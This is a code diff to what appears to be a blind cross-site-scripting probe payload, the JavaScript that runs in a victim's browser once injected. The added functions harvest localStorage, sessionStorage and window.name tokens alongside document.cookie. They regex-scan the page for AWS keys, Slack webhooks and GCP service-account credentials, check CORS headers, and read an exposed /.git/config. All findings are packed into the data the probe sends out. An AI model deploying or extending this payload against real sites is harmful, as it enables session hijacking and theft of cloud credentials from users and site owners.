@@ -113,6 +113,126 @@ function get_dom_text() {
 	return '';
 }
 
+function strip_event_handlers_from_dom() {
+	// Strip inline event handlers, <script> elements, srcdoc iframes and
+	// javascript: URLs before html2canvas clones the DOM into a hidden iframe.
+	// Without this, DOM-based XSS via event handlers OR srcdoc payloads like
+	//   <iframe srcdoc="<script>parent.document.body.appendChild(...)</script>">
+	// will re-trigger the probe inside the clone, causing an infinite loop.
+	try {
+		// 1. Remove all <script> elements — they don't affect visual rendering
+		//    and cloneNode copies them verbatim, causing re-execution risks.
+		var scripts = document.querySelectorAll('script');
+		for (var i = scripts.length - 1; i >= 0; i--) {
+			try { scripts[i].parentNode.removeChild(scripts[i]); } catch(e) {}
+		}
+		// 2. Strip srcdoc from iframes — this is the iframe-payload vector:
+		//    srcdoc scripts run when the clone is inserted into an active doc.
+		var iframes = document.querySelectorAll('iframe[srcdoc]');
+		for (var i = 0; i < iframes.length; i++) {
+			try { iframes[i].removeAttribute('srcdoc'); } catch(e) {}
+		}
+		// 3. Remove all inline on* event handler attributes from every element.
+		var elements = document.querySelectorAll('*');
+		for (var i = 0; i < elements.length; i++) {
+			var el = elements[i];
+			var attrs = el.attributes;
+			for (var j = attrs.length - 1; j >= 0; j--) {
+				if (/^on/i.test(attrs[j].name)) {
+					try { el.removeAttribute(attrs[j].name); } catch(e) {}
+				}
+			}
+			// 4. Strip javascript: URLs from href/src/action/formaction
+			var url_attrs = ['href', 'src', 'action', 'formaction', 'data'];
+			for (var k = 0; k < url_attrs.length; k++) {
+				try {
+					var val = el.getAttribute(url_attrs[k]);
+					if (val && /^\s*javascript:/i.test(val)) {
+						el.removeAttribute(url_attrs[k]);
+					}
+				} catch(e) {}
+			}
+		}
+	} catch(e) {}
+}
+
+function get_storage_data() {
+	// Collect localStorage, sessionStorage, and window.name — common locations
+	// for auth tokens, JWTs, session IDs that HTTP-only cookies miss.
+	var lines = [];
+	try {
+		if (localStorage.length > 0) {
+			lines.push('[LocalStorage]');
+			for (var i = 0; i < localStorage.length; i++) {
+				var k = localStorage.key(i);
+				try { lines.push(k + '=' + localStorage.getItem(k)); } catch(e) {}
+			}
+		}
+	} catch(e) {}
+	try {
+		if (sessionStorage.length > 0) {
+			lines.push('[SessionStorage]');
+			for (var i = 0; i < sessionStorage.length; i++) {
+				var k = sessionStorage.key(i);
+				try { lines.push(k + '=' + sessionStorage.getItem(k)); } catch(e) {}
+			}
+		}
+	} catch(e) {}
+	try {
+		if (window.name) {
+			lines.push('[window.name]');
+			lines.push(window.name);
+		}
+	} catch(e) {}
+	return lines.join('\n');
+}
+
+function look_for_secrets(data) {
+	// Lightweight regex scan for high-value secrets in the page DOM.
+	var findings = [];
+	var patterns = {
+		'aws_access_key':    '((?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16})',
+		'slack_webhook':     '(https://hooks\\.slack\\.com/services/[A-Za-z0-9+/]{44,46})',
+		'gcp_service_acct':  '\\{[^{]+auth_provider_x509_cert_url[^}]+\\}'
+	};
+	for (var type in patterns) {
+		try {
+			var match = new RegExp(patterns[type]).exec(data);
+			if (match) {
+				findings.push({ type: type, value: match[0].substring(0, 200) });
+			}
+		} catch(e) {}
+	}
+	return findings;
+}
+
+async function check_cors() {
+	// Non-null result = page sends Access-Control-Allow-Origin header,
+	// which may allow attacker-controlled origins to read sensitive content.
+	try {
+		var res = await fetch(location.href, { method: 'HEAD' });
+		for (var header of res.headers) {
+			if (header[0].toLowerCase() === 'access-control-allow-origin') {
+				return header[1];
+			}
+		}
+	} catch(e) {}
+	return null;
+}
+
+async function check_git() {
+	// Checks whether /.git/config is publicly accessible — indicates
+	// source code exposure on misconfigured servers.
+	try {
+		var res = await fetch(location.protocol + '//' + location.host + '/.git/config');
+		var text = await res.text();
+		if (text.startsWith('[core]')) {
+			return text.substring(0, 2000);
+		}
+	} catch(e) {}
+	return null;
+}
+
 function generate_random_string(length) {
 	var return_array = [];
 	var characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -203,7 +323,11 @@ try {
     probe_return_data['uri'] = '';
 }
 try {
-    probe_return_data['cookies'] = never_null( document.cookie );
+    var cookie_str = never_null( document.cookie );
+    var storage_str = get_storage_data();
+    probe_return_data['cookies'] = storage_str
+        ? cookie_str + (cookie_str ? '\n' : '') + storage_str
+        : cookie_str;
 } catch ( e ) {
     probe_return_data['cookies'] = '';
 }
@@ -238,19 +362,47 @@ try {
     probe_return_data['injection_key'] = '';
 }
 
-probe_return_data['title'] = document.title;
+try {
+    probe_return_data['title'] = document.title;
+} catch ( e ) {
+    probe_return_data['title'] = '';
+}
+try {
+    probe_return_data['text'] = get_dom_text();
+} catch ( e ) {
+    probe_return_data['text'] = '';
+}
+try {
+    probe_return_data['was_iframe'] = !(window.top === window);
+} catch ( e ) {
+    probe_return_data['was_iframe'] = false;
+}
 
-probe_return_data['text'] = get_dom_text();
-
-probe_return_data['was_iframe'] = !(window.top === window)
-
-function hook_load_if_not_ready() {
+async function hook_load_if_not_ready() {
     try {
-        try {
-            probe_return_data['dom'] = never_null( document.documentElement.outerHTML );
-        } catch ( e ) {
-            probe_return_data['dom'] = '';
-        }
+        // Capture raw DOM first (preserves original markup for forensics).
+        var raw_dom = '';
+        try { raw_dom = never_null( document.documentElement.outerHTML ); } catch ( e ) {}
+
+        // Intelligence checks — best-effort, must not block the core exfil.
+        var intel = {};
+        try { intel['secrets'] = look_for_secrets(raw_dom); } catch(e) { intel['secrets'] = []; }
+        try { intel['cors']        = await check_cors(); }  catch(e) { intel['cors'] = null; }
+        try { intel['git_exposed'] = await check_git(); }   catch(e) { intel['git_exposed'] = null; }
+
+        // Prepend findings as an HTML comment so they appear in the dashboard
+        // DOM viewer without any server-side schema changes.
+        var has_findings = (intel['secrets'] && intel['secrets'].length > 0)
+            || intel['cors'] || intel['git_exposed'];
+        probe_return_data['dom'] = (has_findings
+            ? '<!-- PROBE-INTEL: ' + JSON.stringify(intel) + ' -->\n'
+            : '') + raw_dom;
+
+        // Strip all code-execution vectors AFTER capturing the DOM so the stored
+        // copy has the original markup, but html2canvas gets a sanitised clone.
+        // This covers: on* handlers, <script> tags, srcdoc iframes, javascript: URLs.
+        strip_event_handlers_from_dom();
+
         html2canvas(document.body).then(function(canvas) {
             probe_return_data['screenshot'] = canvas.toDataURL();
             finishing_moves();
